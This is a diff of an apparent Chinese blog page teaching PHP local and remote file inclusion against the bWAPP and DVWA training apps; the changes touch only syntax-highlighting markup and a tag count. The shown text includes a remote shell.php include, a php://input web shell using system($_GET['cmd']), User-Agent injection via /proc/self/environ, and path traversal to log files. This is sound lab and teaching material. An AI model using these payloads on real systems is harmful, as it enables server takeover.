@@ -486,9 +486,9 @@
 <p><a href="http://192.168.1.113/bWAPP/rlfi.php?language=" target="_blank" rel="external">http://192.168.1.113/bWAPP/rlfi.php?language=</a> php://filter/read=convert.base64-encode-resource=<a href="http://192.168.1.11/shell.php" target="_blank" rel="external">http://192.168.1.11/shell.php</a></p>
 </blockquote>
 <p>搞到最后老外自己还来个<strong>厉害了！！！</strong>,把我当时整蒙蔽了。。</p>
-<h1 id="PHP-input输入流"><a href="#PHP-input输入流" class="headerlink" title="PHP input输入流"></a>PHP input输入流</h1><p>套路…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.101/bWAPP/rlfi.php?language=php://input&amp;cmd=ls</div><div class="line">POST:</div><div class="line">&lt;?php system($_GET[&apos;cmd&apos;]);?&gt;</div></pre></td></tr></table></figure></p>
+<h1 id="PHP-input输入流"><a href="#PHP-input输入流" class="headerlink" title="PHP input输入流"></a>PHP input输入流</h1><p>套路…<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//192.168.1.101/bWAPP/rlfi.php?language=php://input&amp;cmd=ls</span></div><div class="line">POST:</div><div class="line">&lt;?php system($_GET[<span class="string">'cmd'</span>]);?&gt;</div></pre></td></tr></table></figure></p>
 <h1 id="Proc-self-environ"><a href="#Proc-self-environ" class="headerlink" title="Proc/self/environ"></a>Proc/self/environ</h1><p>这个有很多种的，不限于这个日志，比如<code>access.log</code>,<code>error_log</code>等各种日志文件。</p>
-<p>通过包含User-Agent的proc/self/environ文件来利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User-Agent: &lt;?php system($_GET[&apos;cmd&apos;]);?&gt;</div><div class="line">http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ&amp;cmd=id</div></pre></td></tr></table></figure></p>
+<p>通过包含User-Agent的proc/self/environ文件来利用<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User-Agent: &lt;?php system(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);?&gt;</div><div class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.102</span><span class="regexp">/dvwa/</span>vulnerabilities<span class="regexp">/fi/</span>?page=proc<span class="regexp">/self/</span>environ&amp;cmd=id</div></pre></td></tr></table></figure></p>
 <h1 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h1><p>自己的小概述</p>
 <h2 id="基本的本地文件包含"><a href="#基本的本地文件包含" class="headerlink" title="基本的本地文件包含"></a>基本的本地文件包含</h2><p><code>&lt;?php include(“inc/” .$_GET[‘file’]);?&gt;</code><br>包含文件在当前目录下：<br><code>?file=.htaccess</code><br>目录遍历：<br><code>？file=../../../../../../../../var/lib/locate.db</code><br>包含注入的PHP代码：<br><code>？file=../../../../../../../var/log/apache/error.log</code><br>一些技巧：</p>
 <ol>
@@ -715,7 +715,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-count">72</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
